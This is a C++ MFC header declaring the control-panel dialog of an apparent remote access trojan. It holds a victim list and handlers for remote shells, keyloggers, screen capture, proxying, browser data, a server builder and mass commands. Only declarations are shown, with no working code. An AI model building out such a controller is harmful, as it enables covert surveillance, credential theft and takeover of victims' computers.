// clientDlg.h : header file
//

#if !defined(AFX_CLIENTDLG_H__7555D475_C86B_4D5A_ABF9_201429BD8D2F__INCLUDED_)
#define AFX_CLIENTDLG_H__7555D475_C86B_4D5A_ABF9_201429BD8D2F__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

/////////////////////////////////////////////////////////////////////////////
// CClientDlg dialog

class CClientDlg : public CDialog
{
// Construction
public:
	CClientDlg(CWnd* pParent = NULL);	// standard constructor
	int CClientDlg::GetCurrentSelection();

// Dialog Data
	//{{AFX_DATA(CClientDlg)
	enum { IDD = IDD_CLIENT_DIALOG };
	CEdit	m_OutputScreen;
	CListCtrl	m_VictimList;
	CStatic	m_StatusBar;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CClientDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	HICON m_hIcon;

	// Generated message map functions
	//{{AFX_MSG(CClientDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnClose();
	afx_msg void OnContextMenu(CWnd* pWnd, CPoint point);
	afx_msg void OnPopupConnectivityDisconnect();
	afx_msg void OnPopupWindowsMessagebox();
	afx_msg void OnPopupWindowsStartshell();
	afx_msg void OnPopupWindowsSysteminfo();
	afx_msg void OnPopupSystemFilebrowser();
	afx_msg void OnPopupRemove();
	afx_msg void OnPopupSystemTaskmgr();
	afx_msg void OnPopupWindowsReboot();
	afx_msg void OnPopupWindowsShutdown();
	afx_msg void OnPopupWindowsKeylogger();
	afx_msg void OnAbout();
	afx_msg void OnPopupSystemProxy();
	afx_msg void OnBuildb();
	afx_msg void OnCopyIp();
	afx_msg void OnCopyAll();
	afx_msg void OnPopupMassKeyloggerOn();
	afx_msg void OnPopupMassKeyloggerOff();
	afx_msg void OnPopupMassProxyOff();
	afx_msg void OnPopupMassProxyOn();
	afx_msg void OnPopupMassDisconnect();
	afx_msg void OnPopupMassRemove();
	afx_msg void OnPopupFirefox();
	afx_msg void OnPopupMassFirefox();
	afx_msg void OnPopupCaptureScreen();
	afx_msg void OnPopupCaptureScreenSend();
	//}}AFX_MSG
	afx_msg LRESULT OnNetMessage(UINT wParam, LONG lParam);
	void CClientDlg::DisplayNewVictim(int i);
	void CClientDlg::RemoveVictim(int i);
	void CopyToClipboard(CString source);
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_CLIENTDLG_H__7555D475_C86B_4D5A_ABF9_201429BD8D2F__INCLUDED_)
